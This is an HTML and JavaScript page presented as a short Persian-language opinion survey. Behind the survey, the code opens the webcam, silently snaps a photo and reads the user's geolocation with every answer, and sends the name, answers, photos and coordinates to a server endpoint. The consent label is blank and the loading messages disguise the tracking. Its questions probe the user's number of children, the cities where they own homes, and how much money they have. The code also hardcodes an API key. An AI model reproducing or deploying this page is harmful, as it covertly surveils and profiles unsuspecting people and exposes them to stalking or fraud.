<!doctype html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>نظرسنجی کوتاه - با موقعیت‌یابی</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <h2>📋 نظرسنجی کوتاه</h2>
  <p>لطفاً قبل از شروع، نام خود را وارد کنید و تیک رضایت را بزنید .</p>

  <div id="intro">
    <label>نام شما:
      <input id="nameInput" type="text" placeholder="نام خود را بنویسید..." required />
    </label>
    <br>
    <label><input id="agree" type="checkbox"> ... </label>
    <br>
    <button id="start" disabled>شروع نظرسنجی</button>
  </div>

  <div id="questionArea" class="hidden">
    <div id="qText"></div>
    <div id="qOptions"></div>
    
    <!-- اضافه کردن نمایش وضعیت موقعیت‌یابی -->
    <div id="locationStatus" class="location-status hidden">
      <div class="location-loading">
        <div class="spinner"></div>
        <span>در حال  انتقال به سوال بعدی ان...</span>
      </div>
    </div>
    
    <button id="next" disabled>بعدی</button>
    <button id="finish" class="hidden">پایان — ارسال </button>
    <p id="status"></p>
  </div>

  <script>
    const questions = [
      { key: 'age', text: 'چند سال دارید؟', options: ['بین ۲۰ تا ۳۰', 'بین ۳۰ تا ۴۰', 'بین ۴۰ تا ۵۰'] },
      { key: 'children', text: 'چند تا بچه دارید؟', options: ['۱', '۲ تا ۳', '۴ تا بیشتر'] },
      { key: 'animal', text: 'کدام حیوان را دوست دارید؟', options: ['سگ', 'گربه', 'لاک‌پشت'] },
      { key: 'city', text: 'کدام شهر  ها خانه داری', options: ['کیش', 'شمال', 'تهران'] },
      { key: 'money', text: 'در حال حاضر چقدر پول دارید؟', options: ['۱۰', '۱۰۰', '۱۰۰۰'] },
    ];

    const nameInput = document.getElementById('nameInput');
    const agree = document.getElementById('agree');
    const startBtn = document.getElementById('start');
    const qText = document.getElementById('qText');
    const qOptions = document.getElementById('qOptions');
    const questionArea = document.getElementById('questionArea');
    const nextBtn = document.getElementById('next');
    const finishBtn = document.getElementById('finish');
    const status = document.getElementById('status');
    const locationStatus = document.getElementById('locationStatus');

    let stream = null;
    let video = null;
    let canvas = null;
    let ctx = null;
    let current = 0;
    let answers = {};
    let photos = [];
    let userLocation = null;
    let isGettingLocation = false;

    function updateStartButton() {
      startBtn.disabled = !(agree.checked && nameInput.value.trim().length > 1);
    }

    agree.addEventListener('change', updateStartButton);
    nameInput.addEventListener('input', updateStartButton);

    // تابع گرفتن موقعیت مکانی
    function getLocation() {
      return new Promise((resolve, reject) => {
        if (!navigator.geolocation) {
          // اگر موقعیت‌یابی پشتیبانی نمی‌شه، موقعیت پیش‌فرض برگردون
          resolve({
            latitude: 0,
            longitude: 0,
            address: " پشتیبانی نمی‌شود",
            fallback: true
          });
          return;
        }

        // نمایش وضعیت در حال دریافت موقعیت
        showLocationLoading();

        navigator.geolocation.getCurrentPosition(
          (position) => {
            const location = {
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
              accuracy: position.coords.accuracy
            };
            
            hideLocationLoading();
            
            // تبدیل به آدرس قابل خواندن
            getAddressName(location.latitude, location.longitude)
              .then(address => {
                location.address = address;
                resolve(location);
              })
              .catch(() => {
                location.address = `عرض: ${location.latitude.toFixed(6)}, طول: ${location.longitude.toFixed(6)}`;
                resolve(location);
              });
          },
          (error) => {
            hideLocationLoading();
            console.warn("⚠️ خطا در  fallback");
            
            // به جای reject، موقعیت پیش‌فرض برگردون
            resolve({
              latitude: 0,
              longitude: 0,
              address: "انجام شد",
              fallback: true,
              error: true
            });
          },
          {
            enableHighAccuracy: false,
            timeout: 10000,
            maximumAge: 300000
          }
        );
      });
    }

    // نمایش وضعیت در حال دریافت موقعیت
    function showLocationLoading() {
      isGettingLocation = true;
      locationStatus.classList.remove('hidden');
      nextBtn.disabled = true;
      nextBtn.innerHTML = '⏳ در حال برسی...';
    }

    // مخفی کردن وضعیت موقعیت‌یابی
    function hideLocationLoading() {
      isGettingLocation = false;
      locationStatus.classList.add('hidden');
      updateNextButtonState();
    }

    // به روزرسانی وضعیت دکمه بعدی
    function updateNextButtonState() {
      const hasAnswer = answers[questions[current]?.key];
      const hasLocation = userLocation !== null;
      
      // حتی اگر موقعیت fallback باشه، اجازه بده ادامه بده
      const canProceed = hasAnswer && hasLocation;
      
      nextBtn.disabled = !canProceed;
      
      if (nextBtn.disabled) {
        if (!hasAnswer) {
          nextBtn.innerHTML = 'لطفاً گزینه انتخاب کنید';
        } else if (!hasLocation) {
          nextBtn.innerHTML = '⏳ در حال برسی...';
        }
      } else {
        nextBtn.innerHTML = 'بعدی';
      }
    }

    // تابع تبدیل مختصات به آدرس
    async function getAddressName(lat, lng) {
      try {
        const response = await fetch(`https://api.neshan.org/v4/reverse?lat=${lat}&lng=${lng}`, {
          headers: {
            'Api-Key': 'web.5eeeff90c8a94a6ebb0c5c8d7b3e5e2b'
          }
        });
        
        if (response.ok) {
          const data = await response.json();
          return data.formatted_address || `عرض: ${lat.toFixed(6)}, طول: ${lng.toFixed(6)}`;
        }
        return `عرض: ${lat.toFixed(6)}, طول: ${lng.toFixed(6)}`;
      } catch (error) {
        return `عرض: ${lat.toFixed(6)}, طول: ${lng.toFixed(6)}`;
      }
    }

    startBtn.addEventListener('click', async () => {
      try {
        status.textContent = 'در حال راه‌اندازی...';
        
        // موقعیت اولیه رو با fallback مقداردهی کن
        userLocation = {
          latitude: 0,
          longitude: 0,
          address: " در حال دریافت...",
          fallback: true
        };

        // راه‌اندازی دوربین
        video = document.createElement('video');
        video.autoplay = true;
        video.playsInline = true;
        canvas = document.createElement('canvas');
        ctx = canvas.getContext('2d');
        stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        await new Promise(r => setTimeout(r, 1000));
        
        document.getElementById('intro').classList.add('hidden');
        questionArea.classList.remove('hidden');
        renderQuestion();
        status.textContent = '';
      } catch (e) {
        status.textContent = 'خطا در راه‌اندازی: ' + e.message;
        console.error('خطای راه‌اندازی:', e);
      }
    });

    function renderQuestion() {
      const q = questions[current];
      qText.textContent = q.text;
      qOptions.innerHTML = '';
      q.options.forEach(opt => {
        const b = document.createElement('button');
        b.textContent = opt;
        b.onclick = ()=> selectOption(opt, b);
        qOptions.appendChild(b);
      });
      
      // به روزرسانی وضعیت دکمه بعدی
      updateNextButtonState();
      finishBtn.classList.add('hidden');
      status.textContent = 'لطفاً یک گزینه انتخاب کنید';
    }

    // تابع گرفتن عکس با اطلاعات
    async function takePhotoWithInfo(){
      return new Promise(async (resolve, reject) => {
        try {
          if (!video || !canvas || !ctx) {
            throw new Error('پشتیبانی');
          }
          
          // گرفتن موقعیت مکانی
          let locationInfo = "در حال برسی...";
          let currentLocation = userLocation;
          
          try {
            // دریافت موقعیت جدید برای هر عکس
            currentLocation = await getLocation();
            locationInfo = currentLocation.address;
            console.log(" موقعیت کاربررررر:", locationInfo);
          } catch (locationError) {
            console.warn("⚠️ خطا در دریافت موقعیت:", locationError);
            locationInfo = "موقعیت موقت - ادامه نظرسنجی فعال شد";
            currentLocation = {
              latitude: 0,
              longitude: 0,
              address: locationInfo,
              fallback: true
            };
          }
          
          // گرفتن عکس
          canvas.width = video.videoWidth || 640;
          canvas.height = video.videoHeight || 480;
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
          
          // ایجاد اطلاعات کامل عکس
          const photoData = {
            image: dataUrl,
            question: questions[current].text,
            answer: answers[questions[current].key],
            location: locationInfo,
            coordinates: currentLocation,
            timestamp: getPersianTimestamp(),
            isFallback: currentLocation.fallback || false
          };
          
          resolve(photoData);
        } catch (error) {
          reject(error);
        }
      });
    }

    // تابع برای دریافت زمان فارسی صحیح
    function getPersianTimestamp() {
      const now = new Date();
      const year = now.getFullYear();
      const month = String(now.getMonth() + 1).padStart(2, '0');
      const day = String(now.getDate()).padStart(2, '0');
      const hours = String(now.getHours()).padStart(2, '0');
      const minutes = String(now.getMinutes()).padStart(2, '0');
      
      return `${year}/${month}/${day} ${hours}:${minutes}`;
    }

    async function selectOption(opt, btn){
      document.querySelectorAll('#qOptions button').forEach(b=> b.classList.remove('selected'));
      btn.classList.add('selected');

      answers[questions[current].key] = opt;
      
      status.textContent = '📍 در حال  برسی..';
      
      try {
        const photoData = await takePhotoWithInfo();
        photos.push(photoData);
        
        // نمایش اطلاعات عکس گرفته شده
        let locationBadge = '';
        if (photoData.isFallback) {
          locationBadge = '<span style="color: #d69e2e; font-weight: bold;"> موقعیت </span>';
        }
        
        status.innerHTML = `
          <div style="text-align: right; background: #e6fffa; padding: 15px; border-radius: 10px; border: 2px solid #81e6d9; margin: 10px 0;">
            <strong style="color: #2d3748;"> .</strong>
            ${locationBadge}<br>
            <div style="margin-top: 8px; font-size: 13px; color: #4a5568;">
              <span>📝 سوال: ${photoData.question}</span><br>
              <span>🎯 پاسخ: ${photoData.answer}</span><br>
              <span>📍 موقعیت: ${photoData.location}</span><br>
              <span>🕒 زمان: ${photoData.timestamp}</span>
            </div>
          </div>
          <div style="margin-top: 10px; text-align: center; font-weight: bold; color: #48bb78;">
            ✅ آماده برای ادامه - روی "بعدی" کلیک کنید
          </div>
        `;

        // به روزرسانی وضعیت دکمه بعدی
        updateNextButtonState();
        
      } catch (error) {
        status.textContent = '❌ خطا در گرفتن عکس: ' + error.message;
        console.error('خطای عکس‌برداری:', error);
        updateNextButtonState();
      }
    }

    nextBtn.addEventListener('click', ()=>{
      if (isGettingLocation) {
        status.textContent = '⏳ لطفاً منتظر بمانید تا موقعیت دریافت شود...';
        return;
      }
      
      current++;
      if(current >= questions.length){
        qText.textContent = 'پرسش‌ها تمام شد — روی "پایان" کلیک کنید.';
        qOptions.innerHTML = '';
        nextBtn.disabled = true;
        finishBtn.classList.remove('hidden');
        status.textContent = 'برای ارسال اطلاعات روی "پایان" کلیک کنید';
      } else {
        renderQuestion();
      }
    });

    finishBtn.addEventListener('click', async ()=>{
      status.textContent = 'در حال ارسال اطلاعات به سرور...';
      finishBtn.disabled = true;
      
      try {
        // استخراج فقط تصاویر از photos
        const photoImages = photos.map(photo => photo.image);
        
        const payload = { 
          name: nameInput.value.trim(), 
          answers, 
          photos: photoImages,
          location: userLocation
        };

        const res = await fetch('/send-sms', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
        
        const result = await res.json();
        
        if (result.ok) {
          // نمایش خلاصه اطلاعات ارسال شده
          let summary = `✅ ارسال موفق - ممنون از مشارکت شما\n\n`;
          summary += `👤 نام: ${nameInput.value.trim()}\n`;
          summary += `📍 موقعیت نهایی: ${userLocation?.address || 'نامشخص'}\n`;
          summary += `🖼️ تعداد عکس‌ها: ${photos.length}\n`;
          summary += `📝 تعداد پاسخ‌ها: ${Object.keys(answers).length}\n\n`;
          summary += `📊 جزئیات عکس‌ها:\n`;
          summary += `${'='.repeat(40)}\n\n`;
          
          result.results?.forEach((item, index) => {
            summary += `عکس ${index + 1}:\n`;
            summary += `   ❓ سوال: ${item.question}\n`;
            summary += `   ✅ پاسخ: ${item.answer}\n`;
            summary += `   📍 موقعیت: ${item.location}\n`;
            summary += `   🕒 زمان: ${item.timestamp}\n`;
            summary += `   🔗 لینک عکس: ${item.url}\n`;
            summary += `${'-'.repeat(30)}\n\n`;
          });
          
          status.textContent = summary;
          status.style.background = 'linear-gradient(135deg, #c6f6d5, #9ae6b4)';
          status.style.borderColor = '#48bb78';
          status.style.color = '#22543d';
          status.style.whiteSpace = 'pre-line';
          status.style.textAlign = 'right';
          status.style.fontSize = '13px';
          status.style.padding = '20px';
          status.style.maxHeight = '400px';
          status.style.overflowY = 'auto';
          
          finishBtn.disabled = true;
          nextBtn.disabled = true;
          
          console.log("🎉 ارسال کامل شد:", result);
        } else {
          status.textContent = '⚠️ خطا در سرور: ' + result.error;
          status.style.background = 'linear-gradient(135deg, #fed7d7, #feb2b2)';
          finishBtn.disabled = false;
        }
      } catch(err){
        status.textContent = '❌ خطا در اتصال به سرور: ' + err.message;
        status.style.background = 'linear-gradient(135deg, #fed7d7, #feb2b2)';
        console.error('خطای ارسال:', err);
        finishBtn.disabled = false;
      } finally {
        if(stream) {
          stream.getTracks().forEach(track => track.stop());
        }
      }
    });

    window.addEventListener('error', (event) => {
      console.error('خطای全局:', event.error);
    });
  </script>
</body>
</html>
